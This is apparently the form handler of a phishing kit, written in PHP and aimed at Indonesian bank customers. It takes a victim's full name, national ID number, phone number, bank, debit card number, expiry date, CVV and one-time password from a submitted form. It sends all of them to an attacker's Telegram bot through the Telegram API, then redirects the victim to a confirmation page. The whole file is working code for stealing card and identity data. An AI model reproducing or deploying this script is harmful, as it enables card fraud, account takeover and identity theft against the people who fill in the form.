<?php 



session_start();
include "./telegram.php";

$_SESSION['phoneNumber'] = $_POST['phoneNumber'];

$message = "<pre>✎﹏﹏𝖍𝖔𝖓𝖊𝖘𝖙.𝖈𝖔.𝖎𝖉﹏﹏</pre>". "<pre>\n𖥠 𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : ". $_POST ['nama']. "</pre>\n<pre>𖥠 𝗡𝗜𝗞 𝗞𝗧𝗣 : ". $_POST ['nik']. "</pre>\n<pre>𖥠 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ". $_POST ['nomor']. "</pre>\n<pre>𖥠 𝗕𝗮𝗻𝗸 : ". $_POST ['bank']. "</pre>\n<pre>𖥠 𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 : ". $_POST ['debitmi']. "</pre>\n<pre>𖥠 𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 : ". $_POST ['valid']. "</pre>\n<pre>𖥠 𝗖𝗩𝗩 : ". $_POST ['cvv']. "</pre>\n<pre>𖥠 𝗢𝗧𝗣 : ". $_POST ['sixpin']. "</pre>";
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  konf.html");
?> 